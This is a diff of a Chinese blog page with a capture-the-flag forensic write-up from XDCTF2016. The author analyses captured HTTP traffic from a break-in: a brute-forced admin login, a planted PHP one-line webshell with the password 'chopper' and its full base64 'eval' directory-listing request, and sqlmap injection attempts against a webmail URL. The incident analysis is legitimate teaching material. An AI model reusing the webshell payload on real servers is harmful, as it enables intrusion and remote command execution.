@@ -6,16 +6,26 @@
   <title>XDCTF2016_铁人三项_WP（HTTP数据包的快速分析） | WinterSun Space</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
-<meta name="keywords" content="writeup,web">
+<meta name="keywords" content="web,writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
 <meta property="og:url" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/index.html">
 <meta property="og:site_name" content="WinterSun Space">
 <meta property="og:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/title.jpg">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sum1.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sum2.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/http.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/login.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/file.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/muma.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/muma2.png">
+<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sqlmap.png">
 <meta property="og:updated_time" content="2016-12-20T02:32:33.131Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
 <meta name="twitter:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
+<meta name="twitter:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/title.jpg">
   
     <link rel="alternative" href="/atom.xml" title="WinterSun Space" type="application/atom+xml">
   
@@ -143,7 +153,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12.5px;">bin</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 15px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a>
+                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12.5px;">bin</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 15px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a>
                     </div>
                 </section>
                 
@@ -258,12 +268,12 @@
       
           
         <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目如下</p>
-
+<img src="/2016/10/05/xdctf2016-wp/title.jpg" alt="title.jpg" title="">
 <p>下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）</p>
-<p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br></p>
+<p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br><img src="/2016/10/05/xdctf2016-wp/sum1.png" alt="sum1.png" title=""></p>
  <a id="more"></a>
-
-<p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br></p>
+<img src="/2016/10/05/xdctf2016-wp/sum2.png" alt="sum2.png" title="">
+<p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br><img src="/2016/10/05/xdctf2016-wp/http.png" alt="http.png" title=""></p>
 <p>接着使用过滤规则<code>http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))</code>，仔细分析对应的HTTP攻击流量。</p>
 <p>然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。</p>
 <p>找了一下发现一个神器<a href="https://github.com/caoqianli/httpcap#usage" target="_blank" rel="external">https://github.com/caoqianli/httpcap#usage</a></p>
@@ -271,13 +281,13 @@
 <p><code>parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html</code></p>
 <p>然后使用notepad++对其进行手工分析（数据量已经很少了。</p>
 <p>找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。</p>
-
+<img src="/2016/10/05/xdctf2016-wp/login.png" alt="login.png" title="">
 <p>发现黑客进入后台后，修改的页面为index.html，题三解决</p>
-
+<img src="/2016/10/05/xdctf2016-wp/file.png" alt="file.png" title="">
 <p>如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为<code>chopper</code>，完整连接地址为<code>http://118.194.196.232/index.php?m=search</code>,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。</p>
-
+<img src="/2016/10/05/xdctf2016-wp/muma.png" alt="muma.png" title="">
 <p>继续往下分析。发现其查看了目录文件，继而返回去分析其命令。</p>
-
+<img src="/2016/10/05/xdctf2016-wp/muma2.png" alt="muma2.png" title="">
 <p><code>chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D</code></p>
 <p>url解码</p>
 <p><code>chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=</code></p>
@@ -285,7 +295,7 @@
 <p>z1为<br><code>/var/www/html/</code></p>
 <p>可知其查看的第一个文件目录为<code>/var/www/html</code>，第六个问题解决。</p>
 <p>发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。</p>
-<p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br></p>
+<p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br><img src="/2016/10/05/xdctf2016-wp/sqlmap.png" alt="sqlmap.png" title=""></p>
 
       
       
@@ -444,7 +454,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/2017-8-10/">810线下赛复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/2017-8-9/">8月9日个人赛总结 && writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/jarvisoj-web/">【web】jarvis oj 刷题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/04/heap-all/">【pwn】cuit2017 & 0ctf2017 heap总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/03/墨色的五月/">墨色的五月</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/27/2017-429-final/">【pwn】2017-429final</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/429-2017/">【pwn】2017-429预赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/arm-double-free-attack/">arm_double_free_attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/09/初探pwntools-fmt特性/">【pwn】 初探pwntools fmt特性</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/how-to-get-libc/">how_to_get_libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/T3CTF2017/">【pwn】T3CTF2017 堆溢出以及return to  dl slove</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/fastbin-attack/">fastbin attack 利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">FILE结构体的溢出利用【FSP】</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xdctf2016-wp/">XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/C-S-WeChat/">C/S-WeChat</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/杂记-2016-7-18/">杂记-2016-7-18</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/ICHUNQIU2016-PWN/">【ICQ2016】 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/20/CCF2016/">【CFF2016-pwn】 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/python命令行执行系统命令/">python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/wargame-pwnable-bf/">[wargame-pwnable] bf</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/2015-问鼎杯线下PWN/">2015-问鼎杯线下PWN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/【pwn】诡异的movsx和cdqe/">【pwn】诡异的movsx和cdqe</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/Auto-post/">Auto post</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/20/pwn-关于栈的迁移/">[pwn] 关于栈的迁移</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/hexo-build/">hexo build</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/18/mprotect/">mprotect 之痛</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/29/cve-2017-office/">对cve-2017-0199与cve-2017-8759的浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/2017-8-10/">810线下赛复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/2017-8-9/">8月9日个人赛总结 && writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/jarvisoj-web/">【web】jarvis oj 刷题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/04/heap-all/">【pwn】cuit2017 & 0ctf2017 heap总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/03/墨色的五月/">墨色的五月</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/27/2017-429-final/">【pwn】2017-429final</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/429-2017/">【pwn】2017-429预赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/arm-double-free-attack/">arm_double_free_attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/09/初探pwntools-fmt特性/">【pwn】 初探pwntools fmt特性</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/how-to-get-libc/">how_to_get_libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/T3CTF2017/">【pwn】T3CTF2017 堆溢出以及return to  dl slove</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/fastbin-attack/">fastbin attack 利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">FILE结构体的溢出利用【FSP】</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xdctf2016-wp/">XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/C-S-WeChat/">C/S-WeChat</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/杂记-2016-7-18/">杂记-2016-7-18</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/ICHUNQIU2016-PWN/">【ICQ2016】 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/20/CCF2016/">【CFF2016-pwn】 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/python命令行执行系统命令/">python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/wargame-pwnable-bf/">[wargame-pwnable] bf</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/2015-问鼎杯线下PWN/">2015-问鼎杯线下PWN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/【pwn】诡异的movsx和cdqe/">【pwn】诡异的movsx和cdqe</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/Auto-post/">Auto post</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/20/pwn-关于栈的迁移/">[pwn] 关于栈的迁移</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/hexo-build/">hexo build</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/18/mprotect/">mprotect 之痛</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
